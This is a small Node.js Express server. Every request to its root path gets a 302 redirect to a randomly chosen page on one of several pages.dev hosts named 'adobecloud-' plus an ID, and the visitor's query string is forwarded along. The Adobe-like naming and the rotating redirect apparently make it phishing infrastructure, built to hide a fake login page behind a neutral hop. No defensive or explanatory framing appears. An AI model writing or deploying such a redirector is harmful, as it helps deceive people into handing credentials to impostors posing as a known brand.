const express = require("express");
const app = express();

const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically

// List of URLs for redirection
const urls = [
    "https://main.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev",
    "https://main.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev",
    "https://3b412ab5.adobecloud-f9a9511a-dbcb-420a-9a76-54dc5088bb30.pages.dev"
];

// Route to handle redirection
app.get("/", (req, res) => {
    // Select a random URL
    const selectedUrl = urls[Math.floor(Math.random() * urls.length)];

    // Append query parameters from request
    const queryParams = req.originalUrl.includes("?") ? req.originalUrl.split("?")[1] : "";
    const redirectUrl = queryParams ? `${selectedUrl}?${queryParams}` : selectedUrl;

    console.log(`Redirecting to: ${redirectUrl}`);
    
    res.redirect(302, redirectUrl);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
